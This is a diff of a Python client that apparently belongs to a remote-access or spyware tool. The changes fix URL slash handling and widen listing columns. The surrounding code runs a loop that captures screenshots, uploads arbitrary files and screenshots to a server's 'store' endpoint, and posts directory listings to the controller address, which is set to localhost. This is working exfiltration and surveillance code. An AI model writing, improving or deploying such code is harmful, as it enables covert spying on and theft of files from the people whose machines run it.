@@ -11,6 +11,8 @@ from math import ceil
 
 save = tempfile.mkdtemp("screen")
 SERVER_IP_ADDRESS = "http://127.0.0.1:5000/"
+if SERVER_IP_ADDRESS[-1] != '/':
+    SERVER_IP_ADDRESS += '/'
 response = ""
 
 if platform.system() == 'Windows':
@@ -47,7 +49,7 @@ while True:
 
                 if os.path.exists(path):
                     fileName = path.split("\\")[-1]
-                    url = SERVER_IP_ADDRESS + '/store'
+                    url = SERVER_IP_ADDRESS + 'store'
                     fo = open(path, 'rb')
                     files = {'file': fo}
                     r = requests.post(url, files = files)
@@ -59,7 +61,7 @@ while True:
                 screenshot = pyautogui.screenshot()
                 screenshot_name = r'\Screenshot_' + datetime.now().strftime('%d-%m-%Y_%H-%M-%S') + '.png'
                 screenshot.save(save + screenshot_name)
-                url = SERVER_IP_ADDRESS + '/store'
+                url = SERVER_IP_ADDRESS + 'store'
                 fo = open(save + screenshot_name, 'rb')
                 files = {'file': fo}
                 r = requests.post(url, files = files)
@@ -100,10 +102,10 @@ while True:
                 for i in os.scandir():
                     date_time_stamp = datetime.fromtimestamp(i.stat().st_mtime).strftime('%d-%m-%Y %H:%M')
                     if os.path.isdir(i):
-                        all_files.append("{:<80} {}".format(i.name+"/", date_time_stamp))
+                        all_files.append("{:<90} {}".format(i.name+"/", date_time_stamp))
                     else:
                         size = str(ceil(i.stat().st_size/1024))+" KB"
-                        all_files.append("{:<80} {} {:>15}".format(i.name, date_time_stamp, size))
+                        all_files.append("{:<90} {} {:>15}".format(i.name, date_time_stamp, size))
                 list_of_files = "\n".join(all_files)
                 r = requests.post(SERVER_IP_ADDRESS, data= list_of_files)
 
